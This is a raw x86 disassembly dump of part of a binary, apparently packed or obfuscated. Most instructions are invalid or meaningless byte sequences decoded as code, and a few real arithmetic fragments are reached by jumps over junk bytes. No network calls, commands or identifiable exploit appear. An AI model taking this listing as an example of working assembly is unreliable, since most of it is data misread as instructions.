  409361:	shr    BYTE PTR [ebx],1
  409363:	cdq    
  409364:	jno    0x4093a8
  409366:	(bad)  
  409367:	out    dx,eax
  409368:	out    0xee,eax
  40936a:	scas   al,BYTE PTR es:[edi]
  40936b:	sbb    bh,bl
  40936d:	push   esp
  40936e:	nop
  40936f:	(bad)  
  409370:	sbb    BYTE PTR [edx-0x2f10e0a1],dh
  409376:	in     al,dx
  409377:	out    0x6c,al
  409379:	in     eax,dx
  40937a:	xor    DWORD PTR [ecx+eax*1],0xffffffd5
  40937e:	add    esi,DWORD PTR [ebx-0x64]
  409381:	inc    esp
  409382:	inc    ecx
  409383:	mov    ds:0x8264f98d,al
  409388:	mov    al,0xbd
  40938a:	xchg   edx,eax
  40938b:	xor    eax,ecx
  40938d:	xor    eax,0x89f45229
  409392:	xchg   BYTE PTR [esi-0x56],dh
  409395:	inc    esp
  409396:	jo     0x40935f
  409398:	xchg   ebp,eax
  409399:	out    0x5f,al
  40939b:	addr16 jnp 0x409322
  40939e:	adc    BYTE PTR [eax-0x20230cce],dh
  4093a4:	(bad)  
  4093a5:	and    eax,DWORD PTR [edx+esi*2+0x59b6ceea]
  4093ac:	jb     0x409333
  4093ae:	lahf   
  4093af:	and    eax,0x71df121e
  4093b4:	mov    esi,0x9921fd2e
  4093b9:	std    
  4093ba:	dec    ecx
  4093bb:	(bad)  
  4093bc:	in     eax,0xf2
  4093be:	pop    ds
  4093bf:	mov    cl,0x36
  4093c1:	cs push ecx
  4093c3:	scas   al,BYTE PTR es:[edi]
  4093c4:	jp     0x40940e
  4093c6:	call   0x3bb03045
  4093cb:	inc    esp
  4093cc:	push   eax
  4093cd:	adc    bl,ah
  4093cf:	xor    BYTE PTR ds:0xb431ccbb,bl
  4093d5:	icebp  
  4093d6:	jns    0x409391
  4093d8:	adc    DWORD PTR [ebx+0x366ae7b5],ebp
  4093de:	repz std 
  4093e0:	jmp    0x293008d3
  4093e5:	fdiv   st(6),st
  4093e7:	(bad)  
  4093e8:	rcr    DWORD PTR [ecx-0x2b],0x5d
  4093ec:	cmp    BYTE PTR [eax-0x24],dh
  4093ef:	out    0x46,al
  4093f1:	jmp    0x2ca0:0x16eab535
  4093f8:	lock pushf 
  4093fa:	xchg   ebp,eax
  4093fb:	gs mov bl,0x7d
  4093fe:	sub    BYTE PTR [eax-0x1ac86320],0x64
  409405:	mov    edi,eax
  409407:	sbb    bh,cl
  409409:	test   DWORD PTR [ebx+0x29],0xb0604a4a
  409410:	jne    0x409427
  409412:	(bad)  
  409413:	mov    eax,ds:0xab196dd7
  409418:	add    al,0x22
  40941a:	idiv   DWORD PTR [ebx-0x2850f0c4]
  409420:	jmp    0x409634
  409425:	clc    
  409426:	icebp  
  409427:	mov    esp,0xb8b16984
  40942c:	icebp  
  40942d:	ficomp DWORD PTR [edx+0x7681fed]
  409433:	push   0x70d8fe57
  409438:	jo     0x4094a3
  40943a:	jg     0x4094ac
  40943c:	jo     0x4093fd
  40943e:	inc    eax
  40943f:	test   ecx,ebp
  409441:	mov    DWORD PTR [ebx-0x3ae1038b],eax
  409447:	repz mov dh,0xd2
  40944a:	fst    st(4)
  40944c:	jno    0x40943b
  40944e:	inc    ecx
  40944f:	std    
  409450:	or     edi,DWORD PTR [ebp+0x32e502a1]
  409456:	mov    al,ds:0x3175cb18
  40945b:	bound  esi,QWORD PTR [edx+0x58e3fe6e]
  409461:	or     al,0xd1
  409463:	sbb    edx,eax
  409465:	sbb    DWORD PTR [eax+0x4a6d4502],ebp
  40946b:	jbe    0x409415
  40946d:	xchg   esi,eax
  40946e:	fild   QWORD PTR [edi+0x54abbcf5]
  409474:	jp     0x409410
  409476:	in     al,dx
  409477:	aam    0x12
  409479:	mov    BYTE PTR [eax],dh
  40947b:	dec    edx
  40947c:	sub    eax,0x69879e68
  409481:	popa   
  409482:	mov    al,ds:0xf865643a
  409487:	jl     0x4094bf
  409489:	in     al,dx
  40948a:	icebp  
  40948b:	daa    
  40948c:	hlt    
  40948d:	pusha  
  40948e:	pop    edi
  40948f:	mov    WORD PTR [esi],fs
  409491:	jp     0x4094a6
  409493:	xchg   edx,eax
  409494:	mov    eax,ds:0x2bc94ba3
  409499:	sub    eax,0x9fdf550f
  40949e:	mov    ds:0xb76effb5,eax
  4094a3:	addr16 (bad) 
  4094a5:	sti    
  4094a6:	dec    eax
  4094a7:	jge    0x409472
  4094a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094aa:	retf   
  4094ab:	jmp    0x4094bb
  4094ad:	mov    bl,BYTE PTR [edi-0x16]
  4094b0:	jmp    0x17c6:0x868650af
  4094b7:	shr    DWORD PTR [ebx-0x5d],cl
  4094ba:	lahf   
  4094bb:	gs leave 
  4094bd:	mov    BYTE PTR [eax-0x6503b082],ah
  4094c3:	and    dh,BYTE PTR [ecx]
  4094c5:	fnstsw WORD PTR [ecx+0x3a]
  4094c8:	jbe    0x409481
  4094ca:	inc    ecx
  4094cb:	mov    DWORD PTR [ecx],ebx
  4094cd:	and    edx,DWORD PTR ds:0xb9bc0883
  4094d3:	mov    edi,0xf2fec557
  4094d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094d9:	push   ebx
  4094da:	ret    
  4094db:	xor    edx,DWORD PTR [eax]
  4094dd:	mov    ds:0x510ad397,al
  4094e2:	xor    eax,0xf9d82ea
  4094e7:	add    al,0xfd
  4094e9:	or     bl,BYTE PTR [esp+edi*4+0x36e7cb6e]
  4094f0:	xor    BYTE PTR [edi-0x4142c6a3],bl
  4094f6:	aas    
  4094f7:	shl    eax,1
  4094f9:	adc    al,0xf9
  4094fb:	fs push ebx
  4094fd:	in     al,0x70
  4094ff:	das    
  409500:	test   DWORD PTR [esi-0x70],0x5caa7ad5
  409507:	push   ss
  409508:	inc    ebp
  409509:	sbb    eax,0x875a3938
  40950e:	fadd   DWORD PTR [ebx-0x3a]
  409511:	sub    al,0x4
  409513:	adc    DWORD PTR [edx-0x1],esi
  409516:	fcmovnbe st,st(4)
  409518:	inc    ebx
  409519:	push   ecx
  40951a:	test   eax,ecx
  40951c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40951d:	pop    edx
  40951e:	out    0x96,eax
  409520:	(bad)  
  409521:	push   esi
  409522:	jo     0x409568
  409524:	repnz test DWORD PTR [edx+0x7e9f24],edi
  40952b:	stos   DWORD PTR es:[edi],eax
  40952c:	inc    eax
  40952d:	bound  eax,QWORD PTR [ecx-0x7c]
  409530:	pop    es
  409531:	(bad)  
  409532:	popa   
  409533:	dec    ebx
  409534:	inc    ecx
  409535:	ret    0xd2b2
  409538:	call   0x607a:0x9594bf7b
  40953f:	xchg   DWORD PTR ds:0x99cf99fe,edx
  409545:	lahf   
  409546:	arpl   ax,bx
  409548:	add    BYTE PTR [edi],0x40
  40954b:	jae    0x4094df
  40954d:	rol    DWORD PTR [ecx-0x3e9758ea],1
  409553:	inc    ebx
  409554:	push   edi
  409555:	dec    esp
  409556:	jl     0x40957e
  409558:	test   al,bl
  40955a:	push   edx
  40955b:	adc    dh,BYTE PTR [eax+0x16]
  40955e:	mov    dh,0x3c
  409560:	add    DWORD PTR [ebx-0x13],ebx
  409563:	mov    edi,0x5d032a33
  409568:	loop   0x4095b8
  40956a:	xor    al,0x2e
  40956c:	jae    0x40958f
  40956e:	test   eax,0x6b848aba
  409573:	aaa    
  409574:	cs iret 
  409576:	sub    edx,DWORD PTR [ebp-0x2faef277]
  40957c:	repz mov eax,0xc07e6298
  409582:	(bad)  
  409583:	mov    ch,0x4c
  409585:	(bad)  
  409586:	or     esi,edi
  409588:	xor    al,BYTE PTR [edx-0x39]
  40958b:	icebp  
  40958c:	jg     0x409602
  40958e:	test   BYTE PTR ds:[ecx+0x42516697],dl
  409595:	pop    edx
  409596:	and    DWORD PTR ds:0x5b69c3d8,edx
  40959c:	mov    eax,0x6d57e1dc
  4095a1:	sub    ah,BYTE PTR [ebx-0x5e]
  4095a4:	scas   al,BYTE PTR es:[edi]
  4095a5:	fidiv  DWORD PTR [ecx-0x6bdbf87e]
  4095ab:	repz mov ds:0xbb867ad4,al
  4095b1:	mov    cl,0x44
  4095b3:	scas   al,BYTE PTR es:[edi]
  4095b4:	in     al,0x79
  4095b6:	aaa    
  4095b7:	fsubp  st(6),st
  4095b9:	pop    ebx
  4095ba:	push   esp
  4095bb:	push   ecx
  4095bc:	(bad)  
  4095bd:	arpl   WORD PTR cs:[eax],ax
  4095c0:	(bad)  
  4095c1:	jbe    0x40960b
  4095c3:	fistp  QWORD PTR [eax+0x32]
  4095c6:	loop   0x409628
  4095c8:	inc    edi
  4095c9:	fiadd  WORD PTR [ecx]
  4095cb:	jo     0x4095a9
  4095cd:	sbb    DWORD PTR [esi+ebx*8-0x75],edx
  4095d1:	jo     0x4095e6
  4095d3:	pop    edi
  4095d4:	xchg   edx,eax
  4095d5:	mov    esi,0xa4cfd7b6
  4095da:	sub    DWORD PTR [edi-0x74245279],edx
  4095e0:	xor    DWORD PTR [ecx+0x7f76915],0x666fa6c0
  4095ea:	lock push cs
  4095ec:	dec    edi
  4095ed:	mov    ebp,DWORD PTR [edx-0x715481fb]
  4095f3:	pop    ebx
  4095f4:	test   al,0x34
  4095f6:	mov    edx,0x12b6b7b2
  4095fb:	stos   BYTE PTR es:[edi],al
  4095fc:	das    
  4095fd:	test   eax,0x6c2c5408
  409602:	ins    DWORD PTR es:[edi],dx
  409603:	iret   
  409604:	nop
  409605:	xor    BYTE PTR [ebp+0x2fb9e5d6],ah
  40960b:	xchg   edx,eax
  40960c:	xchg   DWORD PTR [eax],ebx
  40960e:	or     eax,0xc7b6257a
  409613:	retf   
  409614:	repz fistp QWORD PTR [edx-0x3788a264]
  40961b:	jl     0x409669
  40961d:	jb     0x409699
  40961f:	push   ds
  409620:	adc    eax,0xeb0b8524
  409625:	push   ebx
  409626:	add    DWORD PTR ds:0x208f280f,ecx
  40962c:	outs   dx,BYTE PTR ds:[esi]
  40962d:	mov    eax,ds:0x892d4b54
  409632:	test   DWORD PTR [esi],ebp
  409634:	add    edx,DWORD PTR [ebp-0x14]
  409637:	mov    DWORD PTR [ebp-0x14],edx
  40963a:	mov    edx,DWORD PTR [ebp-0xc]
  40963d:	mov    edi,DWORD PTR [ebp-0x24]
  409640:	xor    edx,eax
  409642:	jmp    0x409856
  409647:	dec    ebp
  409648:	iret   
  409649:	lods   eax,DWORD PTR ds:[esi]
  40964a:	dec    ebx
  40964b:	lods   eax,DWORD PTR ds:[esi]
  40964c:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  409653:	adc    al,0xd7
  409655:	scas   eax,DWORD PTR es:[edi]
  409656:	jecxz  0x40964f
  409658:	out    0x70,al
  40965a:	jo     0x4096c5
  40965c:	jg     0x4096ce
  40965e:	jo     0x409634
  409660:	test   ah,bh
  409662:	pop    esp
  409663:	and    DWORD PTR [ebx-0x38],ebx
  409666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409667:	mov    edx,0xfc274e7d
  40966c:	out    dx,al
  40966d:	out    0x98,al
  40966f:	mov    ah,0xfd
  409671:	shl    DWORD PTR [ebx],cl
  409673:	repnz lods al,BYTE PTR ds:[esi]
  409675:	push   es
  409676:	repnz not BYTE PTR [edi]
  409679:	pop    ds
  40967a:	sbb    DWORD PTR [ebx],ebx
  40967c:	sti    
  40967d:	push   ebp
  40967e:	fdiv   DWORD PTR [ecx+esi*4]
  409681:	(bad)  
  409682:	aaa    
  409683:	xchg   edi,eax
  409684:	and    dl,cl
  409686:	dec    ebp
  409687:	pop    ss
  409688:	fwait
  409689:	cmp    bh,0xeb
  40968c:	popf   
  40968d:	pop    ecx
  40968e:	scas   al,BYTE PTR es:[edi]
  40968f:	push   edi
  409690:	xchg   BYTE PTR [eax],dh
  409692:	call   DWORD PTR [ebp+0x2]
  409695:	lea    edi,[edx]
  409697:	enter  0x660d,0xa0
  40969b:	das    
  40969c:	retf   
  40969d:	pusha  
  40969e:	in     al,0x99
  4096a0:	mov    BYTE PTR [edx+0x11],dh
  4096a3:	push   ecx
  4096a4:	pop    edi
  4096a5:	jle    0x40970b
  4096a7:	outs   dx,BYTE PTR ds:[esi]
  4096a8:	mov    WORD PTR ss:[eax+esi*1+0x740310b3],?
  4096b0:	add    al,0xea
  4096b2:	arpl   cx,bx
  4096b4:	xchg   edx,eax
  4096b5:	(bad)  
  4096b7:	lea    ecx,[eax]
  4096b9:	rcl    DWORD PTR [edi+0x2a8846f9],1
  4096bf:	and    ch,BYTE PTR gs:[ebp+0x707eab2]
  4096c6:	xchg   esp,ebx
  4096c8:	xlat   BYTE PTR ds:[ebx]
  4096c9:	hlt    
  4096ca:	dec    ebp
  4096cb:	xchg   edx,eax
  4096cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096cd:	inc    eax
  4096ce:	xlat   BYTE PTR ds:[ebx]
  4096cf:	mov    ebx,0x9202d9b
  4096d4:	pop    ebx
  4096d5:	ins    BYTE PTR es:[edi],dx
  4096d6:	fwait
  4096d7:	or     eax,0xc95f9546
  4096dc:	jp     0x409670
  4096de:	outs   dx,BYTE PTR ds:[esi]
  4096df:	jae    0x409751
  4096e1:	call   0x3066:0xc2eb9e12
  4096e8:	and    DWORD PTR [ebx+0x6fa45616],esi
  4096ee:	cwde   
  4096ef:	xchg   esp,eax
  4096f0:	ret    
  4096f1:	jge    0x409705
  4096f3:	data16 loopne 0x409738
  4096f6:	test   BYTE PTR [eax],0x48
  4096f9:	mov    esi,0x962520
  4096fe:	les    esi,FWORD PTR [ebp-0x53]
  409701:	adc    ebx,DWORD PTR [eax-0x33]
  409704:	dec    edi
  409705:	jne    0x4096e2
  409707:	cs xor eax,0x9967e75d
  40970d:	fs out dx,al
  40970f:	popa   
  409710:	cmp    BYTE PTR [edx-0x6a0703ae],0x4e
  409717:	xlat   BYTE PTR ds:[ebx]
  409718:	outs   dx,DWORD PTR ds:[esi]
  409719:	rcr    BYTE PTR [ecx+edi*1+0x15],cl
  40971d:	push   eax
  40971e:	cmp    BYTE PTR [ecx+0x68],0x6b
  409722:	dec    esp
  409723:	cdq    
  409724:	test   ecx,esi
  409726:	mov    ch,dh
  409728:	cld    
  409729:	mov    DWORD PTR [ecx+0x4917f3d8],eax
  40972f:	sahf   
  409730:	push   esp
  409731:	loop   0x409778
  409733:	cwde   
  409734:	sbb    al,0xf7
  409736:	pshufw mm1,QWORD PTR [ebp+0x6f],0xee
  40973b:	out    dx,al
  40973c:	leave  
  40973d:	or     al,0xf1
  40973f:	mov    edi,0xb250b193
  409744:	or     ebp,DWORD PTR [esi]
  409746:	popa   
  409747:	jmp    DWORD PTR [esi]
  409749:	pop    ecx
  40974a:	mov    ebp,db1
  40974d:	inc    edi
  40974e:	(bad)  
  40974f:	cli    
  409750:	add    ah,cl
  409752:	or     al,0x29
  409754:	mov    sp,0x6a4f
  409758:	xor    ebx,DWORD PTR [esi+edx*1-0x340bc31a]
  40975f:	inc    ebp
  409760:	jecxz  0x4097c1
  409762:	mov    ds:0xfb5786bd,al
  409767:	in     al,0xa6
  409769:	pop    eax
  40976a:	imul   esp,DWORD PTR [esi+0x5381cd26],0x7a
  409771:	in     eax,0x8b
  409773:	add    eax,0x40e93d79
  409778:	mov    dl,0xe4
  40977a:	dec    edi
  40977b:	test   al,0xf8
  40977d:	sbb    DWORD PTR [esi+0x3068b5fc],eax
  409783:	mov    BYTE PTR [esp+edi*8+0x2c],dl
  409787:	add    eax,0xba86dea
  40978c:	or     bl,ch
  40978e:	je     0x4097ee
  409790:	xchg   edi,eax
  409791:	push   ebx
  409792:	xchg   DWORD PTR [edi-0x4b],edi
  409795:	xchg   ecx,eax
  409796:	rol    WORD PTR [edx+0x6b],1
  40979a:	jae    0x409815
  40979c:	cld    
  40979d:	fldenv [eax+0x1]
  4097a0:	adc    DWORD PTR [edi+0x30],ecx
  4097a3:	lea    ebp,[edx-0x7d03f4d]
  4097a9:	enter  0x20c5,0xeb
  4097ad:	call   0xc86b:0xce0d5bd0
  4097b4:	inc    esp
  4097b5:	arpl   WORD PTR [esi+0x5e],bx
  4097b8:	and    BYTE PTR [edi],dl
  4097ba:	test   eax,0x408f474
  4097bf:	pop    edx
  4097c0:	out    dx,eax
  4097c1:	lods   eax,DWORD PTR ds:[esi]
  4097c2:	add    edx,DWORD PTR [ecx]
  4097c4:	push   edx
  4097c5:	dec    DWORD PTR [edi+esi*1-0x16ab3dab]
  4097cc:	adc    al,0x84
  4097ce:	cmp    dh,BYTE PTR [ebp+0x62a49eff]
  4097d4:	inc    eax
  4097d5:	lods   al,BYTE PTR ds:[esi]
  4097d6:	pop    ebx
  4097d7:	scas   al,BYTE PTR es:[edi]
  4097d8:	mov    eax,ds:0xec2a344d
  4097dd:	inc    esp
  4097de:	adc    eax,0xd072f7d7
  4097e3:	bnd jns 0x40978b
  4097e6:	sbb    BYTE PTR [ebp-0x9],0x4e
  4097ea:	jns    0x409862
  4097ec:	repnz cmc 
  4097ee:	cld    
  4097ef:	and    BYTE PTR [ecx+0x1bc90057],dl
  4097f5:	std    
  4097f6:	out    0x7b,eax
  4097f8:	ins    BYTE PTR es:[edi],dx
  4097f9:	or     ebx,ebp
  4097fb:	jmp    DWORD PTR [ebp+0x7df1d112]
  409801:	mov    ecx,0xa04746cb
  409806:	sar    edi,cl
  409808:	cmp    eax,0xeece9079
  40980d:	mov    dl,0x76
  40980f:	mov    bl,BYTE PTR [ecx+0x391ec999]
  409815:	loop   0x40981f
  409817:	inc    edx
  409818:	mov    cl,0xd1
  40981a:	out    0x76,al
  40981c:	xor    ah,BYTE PTR es:[esp+ebx*4]
  409820:	pop    es
  409821:	jno    0x4097cd
  409823:	(bad)  
  409824:	scas   al,BYTE PTR es:[edi]
  409825:	sbb    eax,0x700e990b
  40982a:	adc    ebx,DWORD PTR [eax+0x2cff2190]
  409830:	aad    0x99
  409832:	outs   dx,BYTE PTR ds:[esi]
  409833:	inc    edx
  409834:	or     edi,DWORD PTR [edi-0x12]
  409837:	and    esi,eax
  409839:	loopne 0x4098b1
  40983b:	mov    edi,0x4d6a7192
  409840:	aad    0x3
  409842:	out    dx,al
  409843:	sub    ecx,DWORD PTR [eax]
  409845:	and    eax,0x98986727
  40984a:	ffreep st(4)
  40984c:	jmp    0xfb040152
  409851:	mov    ebx,0x325b936e
  409856:	add    edx,ecx
  409858:	imul   edx,edi
  40985b:	mov    edi,DWORD PTR [ebp-0xc]
  40985e:	xor    edi,eax
  409860:	sub    edx,edi
  409862:	mov    edi,DWORD PTR [ebp-0xc]
  409865:	mov    ebx,DWORD PTR [ebp-0x14]
  409868:	xor    edi,eax
  40986a:	add    edi,ecx
  40986c:	imul   edi,ebx
  40986f:	mov    ebx,DWORD PTR [ebp-0x18]
  409872:	xor    ebx,eax
  409874:	sub    edx,ecx
  409876:	lea    edi,[edi+ebx*1+0x32729c]
  40987d:	cmp    edi,edx
  40987f:	jbe    0x408b6b
  409885:	mov    edx,DWORD PTR [ebp-0xc]
  409888:	jmp    0x409a9c
  40988d:	int3   
  40988e:	sub    eax,0xbde9be20
  409893:	push   0xffffffa9
  409895:	mov    ebp,0x47bf628
  40989a:	ins    BYTE PTR es:[edi],dx
  40989b:	dec    esp
  40989c:	add    eax,esp
  40989e:	in     al,0x70
  4098a0:	jo     0x40990b
  4098a2:	jg     0x409914
  4098a4:	jo     0x40985c
  4098a6:	stc    
  4098a7:	xor    ecx,DWORD PTR [edi+ebp*2+0x57b80070]
  4098ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098af:	push   ds
  4098b0:	daa    
  4098b1:	dec    edx
  4098b2:	lahf   
  4098b3:	les    ebp,FWORD PTR [ebx]
  4098b5:	sbb    edi,DWORD PTR [edi]
  4098b7:	push   ss
  4098b8:	push   es
  4098b9:	jg     0x4098a5
  4098bb:	inc    ebx
  4098bc:	or     bh,al
  4098be:	sub    dh,0xd7
  4098c1:	fwait
  4098c2:	dec    eax
  4098c3:	jle    0x409850
  4098c5:	and    bh,dh
  4098c7:	and    esp,ebx
  4098c9:	les    ebp,FWORD PTR [ebx+0x6822b24b]
  4098cf:	cmc    
  4098d0:	mov    al,ds:0x8217f5c6
  4098d5:	int3   
  4098d6:	(bad)  
  4098d7:	jge    0x4098e1
  4098d9:	aad    0x20
  4098db:	xchg   esi,eax
  4098dc:	or     cl,BYTE PTR [ebx*1+0x630164d0]
  4098e3:	push   esp
  4098e4:	shr    al,0x28
  4098e7:	loopne 0x4098e9
  4098e9:	xchg   ebx,eax
  4098ea:	dec    esi
  4098eb:	hlt    
  4098ec:	push   edx
  4098ed:	daa    
  4098ee:	dec    edx
  4098ef:	aam    0xd
  4098f1:	jge    0x4098a0
  4098f3:	sbb    ebp,DWORD PTR gs:[ebx+edi*4-0x61]
  4098f8:	dec    edi
  4098f9:	fld    TBYTE PTR [ebp-0x3]
  4098fc:	in     eax,0xcf
  4098fe:	imul   ebp,ebp,0x86ed2c88
  409904:	dec    ecx
  409905:	xchg   DWORD PTR [ebp-0x5],esp
  409908:	sub    bl,BYTE PTR [ebp-0x6b]
  40990b:	aam    0xb5
  40990d:	cli    
  40990e:	imul   edi,DWORD PTR [esi-0x14],0x78
  409912:	sub    BYTE PTR [eax],cl
  409914:	add    esp,DWORD PTR [eax+edi*1+0x26]
  409918:	push   ecx
  409919:	push   ecx
  40991a:	dec    esi
  40991b:	mov    dh,0xfc
  40991d:	mov    esp,0x9784709d
  409922:	pop    esp
  409923:	(bad)  
  409925:	cmp    bl,bl
  409927:	sbb    bh,BYTE PTR [edi+0x43]
  40992a:	repnz mov ds:0x2c8a8a46,eax
  409930:	mov    ah,BYTE PTR [esi-0x6afa51f9]
  409936:	repz jae 0x40999c
  409939:	sub    dl,BYTE PTR [edx-0x2bea359f]
  40993f:	pop    esi
  409940:	mov    esi,0xe8a98598
  409945:	jmpw   0xa887
  409949:	les    esp,FWORD PTR [edx]
  40994b:	inc    esi
  40994c:	xor    eax,0x86d81719
  409951:	ins    BYTE PTR es:[edi],dx
  409952:	adc    eax,0xc1e25b52
  409957:	fsubr  st(2),st
  409959:	push   ebx
  40995a:	in     al,dx
  40995b:	int3   
  40995c:	cmp    eax,0xd18b9216
  409961:	sbb    eax,0x355eef7a
  409966:	pop    edx
  409967:	xor    eax,0xe51d3334
  40996c:	cdq    
  40996d:	jecxz  0x4099d4
  40996f:	inc    ecx
  409970:	in     eax,dx
  409971:	xchg   ecx,ebx
  409973:	gs dec edx
  409975:	lods   al,BYTE PTR ds:[esi]
  409976:	pop    ds
  409977:	lods   eax,DWORD PTR ds:[esi]
  409978:	push   ebx
  409979:	(bad)  
  40997a:	popa   
  40997b:	lock lods eax,DWORD PTR ds:[esi]
  40997d:	hlt    
  40997e:	es pusha 
  409980:	or     al,0xc1
  409982:	mov    ds:0xebc05700,al
  409987:	das    
  409988:	xor    BYTE PTR [edi-0x7bf9abbb],0x99
  40998f:	lahf   
  409990:	xor    ch,dh
  409992:	ds push esp
  409994:	ffree  st(7)
  409996:	or     DWORD PTR [ecx-0x78],esp
  409999:	or     al,0x38
  40999b:	push   ecx
  40999c:	out    0xbc,al
  40999e:	in     eax,0x24
  4099a0:	call   0xbf2d:0x8f0ed08e
  4099a7:	ins    BYTE PTR es:[edi],dx
  4099a8:	add    ah,BYTE PTR [edi+ebp*1+0x76]
  4099ac:	mov    eax,0xda91830e
  4099b1:	xlat   BYTE PTR ds:[ebx]
  4099b2:	dec    ebp
  4099b3:	mov    dl,0x72
  4099b5:	mov    bh,0x36
  4099b7:	dec    ebx
  4099b8:	(bad)  
  4099b9:	jns    0x409a27
  4099bb:	in     al,dx
  4099bc:	xlat   BYTE PTR ds:[ebx]
  4099bd:	(bad)  
  4099be:	shl    DWORD PTR [edi-0x7a57e6ca],0xf4
  4099c5:	js     0x4099b5
  4099c7:	scas   al,BYTE PTR es:[edi]
  4099c8:	jbe    0x4099f2
  4099ca:	in     al,dx
  4099cb:	(bad)  
  4099cc:	sub    esi,eax
  4099ce:	xor    BYTE PTR [ecx],bh
  4099d0:	mov    bl,0x4d
  4099d2:	aad    0x8b
  4099d4:	ror    edi,0x7f
  4099d7:	bound  esi,QWORD PTR [edx-0x67ff70ca]
  4099dd:	(bad)  
  4099de:	mov    edx,0x658234be
  4099e3:	mov    al,ds:0x19dcdf08
  4099e8:	out    0xf6,al
  4099ea:	lea    ebp,[ebp-0x19e1f832]
  4099f0:	sbb    eax,0xf1a7916a
  4099f5:	aad    0xd1
  4099f7:	les    esp,FWORD PTR [esi+0x2b629c11]
  4099fd:	mov    al,ds:0x1c6c304c
  409a02:	sbb    edx,esp
  409a04:	cli    
  409a05:	push   eax
  409a06:	sbb    ch,bl
  409a08:	out    0x8a,eax
  409a0a:	push   0x99a33477
  409a0f:	imul   eax,DWORD PTR [esi+0x343edc04],0x2e
  409a16:	jmp    0x4099e9
  409a18:	sub    dh,BYTE PTR [eax+0x16]
  409a1b:	pusha  
  409a1c:	lds    eax,FWORD PTR [edx-0x739d05e1]
  409a22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a23:	scas   al,BYTE PTR es:[edi]
  409a24:	mov    WORD PTR [edi],es
  409a26:	pop    ss
  409a27:	shl    DWORD PTR [ebp-0x51],cl
  409a2a:	ins    BYTE PTR es:[edi],dx
  409a2b:	and    esp,DWORD PTR [ebp+0xb]
  409a2e:	xchg   ebx,eax
  409a2f:	or     eax,0x959f5157
  409a34:	inc    esi
  409a35:	add    al,0x15
  409a37:	adc    bl,BYTE PTR [eax+edi*4]
  409a3a:	sbb    al,0xf3
  409a3c:	pop    ecx
  409a3d:	jo     0x409ab5
  409a3f:	sahf   
  409a40:	sub    al,0x1b
  409a42:	pop    esi
  409a43:	outs   dx,BYTE PTR ds:[esi]
  409a44:	xor    DWORD PTR [esi-0x5eaab037],esi
  409a4a:	push   edi
  409a4b:	inc    BYTE PTR [ecx+0x28]
  409a4e:	fimul  WORD PTR [edi-0x13]
  409a51:	sbb    eax,0x35d1ede
  409a56:	push   edi
  409a57:	dec    edx
  409a58:	outs   dx,DWORD PTR ds:[esi]
  409a59:	mov    edi,0x42b2d2d6
  409a5e:	push   0x6e
  409a60:	or     eax,0x6363ba5
  409a65:	xor    BYTE PTR [edi+edx*2],ah
  409a68:	popf   
  409a69:	fdivr  QWORD PTR [eax+eiz*4]
  409a6c:	loope  0x409a35
  409a6e:	add    cl,BYTE PTR [ebx+eax*4+0x24db37a5]
  409a75:	sbb    ah,al
  409a77:	cmp    eax,0xedc61a60
  409a7c:	dec    ebx
  409a7d:	mov    edi,0xe1a20ea
  409a82:	and    edi,DWORD PTR [ebp-0xd]
  409a85:	bt     DWORD PTR [esi*1-0x44ca76f7],esp
  409a8d:	jmp    0x6b24:0x182b8d20
  409a94:	pop    edi
  409a95:	push   ebp
  409a96:	mov    BYTE PTR [esi],cl
  409a98:	out    0x70,eax
  409a9a:	cli    
  409a9b:	jne    0x409a28
  409a9d:	jge    0x409a7b
  409a9f:	xor    edx,eax
  409aa1:	add    edx,ecx
  409aa3:	imul   edx,edi
  409aa6:	mov    edi,DWORD PTR [ebp-0x18]
  409aa9:	xor    edi,eax
  409aab:	add    edx,edi
  409aad:	mov    edi,DWORD PTR [ebp-0x8]
  409ab0:	lea    edx,[edx+edi*1+0x32729c]
  409ab7:	mov    DWORD PTR [ebp-0x8],edx
  409aba:	mov    edx,DWORD PTR [ebp-0x20]
  409abd:	jmp    0x409cd1
  409ac2:	popa   
  409ac3:	ja     0x409abc
  409ac5:	add    esi,ecx
  409ac7:	xor    DWORD PTR [ecx+0x75],0xffffffde
  409acb:	adc    al,0xb4
  409acd:	mov    dh,cl
  409acf:	inc    esp
  409ad0:	mov    eax,ds:0x70e2d90f
  409ad5:	jo     0x409b40
  409ad7:	jg     0x409b49
  409ad9:	jo     0x409aa5
  409adb:	adc    dl,BYTE PTR [eax]
  409add:	jl     0x409add
  409adf:	lods   eax,DWORD PTR es:[esi]
  409ae1:	stos   BYTE PTR es:[edi],al
  409ae2:	stos   DWORD PTR es:[edi],eax
  409ae3:	mov    ebp,0xaf35d3c4
  409ae8:	mov    gs,WORD PTR [ebp+0x57]
  409aeb:	sbb    cl,BYTE PTR [edi+edx*8]
  409aee:	xchg   BYTE PTR [edx],ch
  409af0:	test   DWORD PTR [ecx],ebp
  409af2:	xchg   edi,eax
  409af3:	mov    edi,0x62434203
  409af8:	call   0x4d21:0x9507bc44
  409aff:	and    al,0x3a
  409b01:	call   FWORD PTR [ecx-0x44c398bd]
  409b07:	test   al,0x91
  409b09:	loopne 0x409b27
  409b0b:	mov    ch,0x3a
  409b0d:	jmp    0xe39f:0x90084a86
  409b14:	ja     0x409aec
  409b16:	jnp    0x409b0e
  409b18:	cwde   
  409b19:	pop    eax
  409b1a:	adc    esi,DWORD PTR [esi]
  409b1c:	jmp    0x174ee9e
  409b21:	jae    0x409aa3
  409b23:	cli    
  409b24:	rcl    DWORD PTR [ecx+edx*8-0x2b772893],1
  409b2b:	inc    edi
  409b2c:	daa    
  409b2d:	sub    ebp,DWORD PTR [edi+0x42]
  409b30:	mov    ch,0xe1
  409b32:	fldcw  WORD PTR [edx+0x74]
  409b35:	mov    dl,0x92
  409b37:	nop    DWORD PTR [ebp-0x23987475]
  409b3e:	sub    DWORD PTR [eax],edi
  409b40:	in     eax,0x42
  409b42:	add    al,0x71
  409b44:	(bad)  
  409b45:	xor    BYTE PTR [edx+0x4f],dh
  409b48:	out    dx,eax
  409b49:	push   edx
  409b4a:	nop
  409b4b:	push   ebp
  409b4c:	je     0x409b7f
  409b4e:	jp     0x409bac
  409b50:	add    al,BYTE PTR [edx+eiz*2-0x2fb62dca]
